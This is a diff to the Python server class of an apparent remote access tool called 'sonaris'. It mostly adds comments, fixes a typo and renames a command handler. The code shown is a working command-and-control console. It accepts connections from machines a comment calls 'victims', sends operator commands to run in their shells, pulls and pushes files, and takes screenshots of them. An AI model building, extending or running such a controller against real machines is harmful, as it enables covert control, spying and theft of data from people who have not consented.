@@ -21,11 +21,12 @@ class Server(object):
         self.__Address = (host, port)
         self.connectedUsers = {}
         self.userAttached = self.userCwd = ''
-        self.especialComamnds = {'clear': self.clearScreen, 'cls': self.clearScreen, 'exit': self.closeTerminal}
+        self.especialCommands = {'clear': self.clearScreen, 'cls': self.clearScreen, 'exit': self.closeTerminal}
 
     def __repr__(self):
         print(f'Server(host="{self.__Address[0]}", port={self.__Address[1]})')
 
+    # attaches to an active session
     def attach(self, name):
         if name:
             if self.connectedUsers.get(name):
@@ -37,28 +38,34 @@ class Server(object):
         else:
             printr('Info: Attaches to an active session. [green]Ex: /attach zNairy-PC')
 
+    # detach a active session
     def detach(self, name):
         if self.userAttached:
             self.userAttached = self.userCwd = ''
         else:
             printr(f'[red] No session currently attached.')
 
+    # checking if folders for screenshot or downloaded files exists
     def checkFolders(self):
-        for folder in ['./screenshots','files']:
+        for folder in ['./screenshots','./files']:
             if not Path(folder).is_dir():
                 Path(folder).mkdir()
 
+    # send header to client side (about messages, files...)
     def sendHeader(self, connection, header):
         connection.send(dumps(header))
 
+    # return name of file, your extension and bytes content
     def splitFile(self, path):
         with open(path, 'rb') as file:
             return Path(path).stem, Path(path).suffix, file.read()
 
+    # saving any received file from client side
     def saveReceivedFile(self, path, content):
         with open(path, 'wb') as receivedFile:
             receivedFile.write(content)
 
+    # receiving bytes content of any file from client side | params: connection= current user attached, header= received header of file
     def receiveFile(self, connection, header):
         progress = Progress("[progress.description][green]{task.description}", BarColumn(), "[progress.percentage]{task.percentage:>3.0f}%", TimeRemainingColumn())
 
@@ -74,6 +81,7 @@ class Server(object):
 
         self.saveReceivedFile(f'./{header["path"]}/{header["namefile"]}{header["extension"]}', file)
     
+    # uploading a local file (server side) to client side
     def upload(self, args):
         if self.userAttached:
             if args:
@@ -102,6 +110,7 @@ class Server(object):
         else:
             printr('[yellow] No session currently attached.')
 
+    # downloading a file from client side
     def download(self, args):
         self.checkFolders()
 
@@ -119,6 +128,7 @@ class Server(object):
         else:
             printr('[yellow] No session currently attached.')
 
+    # taking a screenshot from client side
     def screenshot(self, args):
         self.checkFolders()
 
@@ -130,12 +140,15 @@ class Server(object):
         else:
             printr('[yellow] No session currently attached.')
 
+    # calculating time response of some command  | params: ti= start time, tf= final time 
     def elapsedTime(self, ti, tf):
         return f'{int(tf[0])-int(ti[0])}.{int(tf[1])-int(ti[1])}'
 
+    # adding the user to a session 
     def addUser(self, data):
         self.connectedUsers.update({data['name']: data})
-
+    
+    # removing the user from a session 
     def removeUser(self, name):
         if name:
             if self.connectedUsers.get(name):
@@ -147,37 +160,47 @@ class Server(object):
                 printr(f'[red] There is no open session with [yellow]{name}.')
         else:
             print('Info: Removes an active section. [green]Ex: /rmsession zNairy-PC')
-
+    
+    # cleaning the screen (obviously) 
     def clearScreen(self, args=''):
         system('clear' if uname().sysname.lower() == 'linux' else 'cls')
 
+    # showing the active sessions 
     def showSessions(self, args):
         if self.connectedUsers:
             print(''.join(f'  -{name}\n' for name in self.connectedUsers.keys()))
         else:
             printr('[yellow] There is no open sessions currently.')
 
+    # showing the version of program
     def showVersion(self, args):
         printr(__version__)
 
+    # showing how you can contact the author of code
     def showContact(self, args):
         printr(__contact__)
 
+    # showing the author of code | "well, of couse i know him. He's me"
     def showCodeAuthor(self, args):
         printr(__author__)
 
+    # closing the session/terminal session and exiting the program 
     def closeTerminal(self, args=''):
         exit()
 
+    # showing the available commands to use
     def availableCommands(self, args):
         printr(''.join(f'  {command}\n' for command in self.allCommands().keys() ))
 
+    # showing the last used command 
     def showLastCommand(self, args):
         printr(self.lastCommand)
 
+    # showing only the internal commands
     def internalcommands(self, args):
         printr(''.join(f'  {command}\n' for command in self.allCommands().keys() if self.allCommands()[command]['local']))
 
+    # return all defined commands of program | setting a new command, name, your action, features...
     def allCommands(self):
         commands = {
             "/attach": {"local": True, "action": self.attach},
@@ -190,71 +213,82 @@ class Server(object):
             "/author": {"local": True, "action": self.showCodeAuthor},
             "/contact": {"local": True, "action": self.showContact},
             "/version": {"local": True, "action": self.showVersion},
+            "/lastcommand": {"local": True, "action": self.showLastCommand},
             "/internalcommands": {"local": True, "action": self.internalcommands},
         }
 
-        commands.update({"/commands": {"local": True, "action": self.availableCommands}})
+        commands.update({"/commands": {"local": True, "action": self.availableCommands}}) # adding /commands to show all commands available to use
 
         return commands
 
+    # returns function of the command (your action) and your respective arguments, if exists, if not returns False.
     def splitCommand(self, command):
         if self.allCommands().get(command.split()[0]):
-            return self.allCommands()[command.split()[0]], ''.join(f'{cmd} ' for cmd in command.split()[1:]) # 1: function, 2: args #
+            # 0: function, 1: args | example: /attach znairy = self.attach, 'znairy'
+            return self.allCommands()[command.split()[0]]["action"], ''.join(f'{cmd} ' for cmd in command.split()[1:])
 
-        return False, ''.join(f'{cmd} ' for cmd in command.split()[1:])
+        return False # command does not exist
 
-    def checkCommand(self, command):
+    # checking the possible commands (strings that starts with "/")
+    def runCommand(self, command):
         self.lastCommand = command
 
         command, args = self.splitCommand(command)
         if command:
-            command['action'](args.strip())
+            command(args.strip()) # running the command passing your arguments #
         else:
             printr('[red] Command does not exist.')
 
+    # receiving bytes from command response 
     def receiveCommand(self, connection, header):
         received = b''
         while len(received) < header['bytes']:
             received += connection.recv(header['bytes'])
 
         print(received.decode())
-        printr(f'returned in {self.elapsedTime(header["time"], datetime.now().strftime("%M %S").split())} seconds.')
+        printr(f'returned in {self.elapsedTime(header["time"], datetime.now().strftime("%M %S").split())} seconds.') # time response of command
 
+    # send command to be execute in shell of client side
     def sendCommand(self, command):
         self.lastCommand = command
 
-        if self.userAttached:
-            connection = self.connectedUsers[self.userAttached]['conn']
+        if self.userAttached: # if exists session attached
+            connection = self.connectedUsers[self.userAttached]['conn'] # getting the socket object from the current user
             connection.send(command.encode())
-            header = loads(connection.recv(512))
-            self.userCwd = header['currentDirectory']
+            header = loads(connection.recv(512)) # receiving header of the command
+            self.userCwd = header['currentDirectory'] # updating the current directory you are
             self.receiveCommand(connection, header)
         else:
             printr('[yellow] No session currently attached.')
 
+    # starting the 'terminal' to get commands
     def startTerminal(self):
         try:
             while True:
+                # yourusername@sonaris: current directory you are
                 printr(f'[green]{getuser()}'+ '[white]@' + f'[green]sonaris[white]:{self.userCwd}# ', end='')
                 command = input().strip()
+                
                 if command:
-                    if command.split()[0] not in ['clear', 'cls', 'exit']:
-                        if command.startswith('/'):
-                            self.checkCommand(command)
+                    if command.split()[0] not in ['clear', 'cls', 'exit']: # 'especial' commands
+                        if command.startswith('/'): # characteristic of an server command
+                            self.runCommand(command)
                         else:
-                            self.sendCommand(command)
+                            self.sendCommand(command) # send to client side
                     else:
-                        self.especialComamnds[command.split()[0]]()
+                        self.especialCommands[command.split()[0]]()
 
         except KeyboardInterrupt:
             print()
             exit()
 
+    # start a thread
     def startProcess(self, function, arg=()):
         thread = Thread(target=function)
         thread.daemon = True
         thread.start()
 
+    # receive the connections from the 'victims' in a paralel process
     def listenConnections(self):
         while True:
             connection, address = self.__Server.accept();del(address)
@@ -264,6 +298,7 @@ class Server(object):
             printr(f'\n[*] Incoming connection from [green]{response["name"]}:{response["SO"]}')
             printr(f'[green]{getuser()}'+ '[white]@' + f'[green]sonaris[white]#:{self.userCwd}# ', end='')
 
+    # configuring the socket object
     def configureSocket(self):
         try:
             self.__Server = socket(AF_INET, SOCK_STREAM)
@@ -278,9 +313,11 @@ class Server(object):
         except gaierror:
             printr(f' "{self.__Address[0]}" [red]Name or service not known');exit(1)
 
+    # showing the info/configuration of the server (your address and port)
     def info(self):
         return f' Server is open in {self.__Address[0]}:{self.__Address[1]}'
 
+    # starting the program
     def run(self):
         self.configureSocket()
         
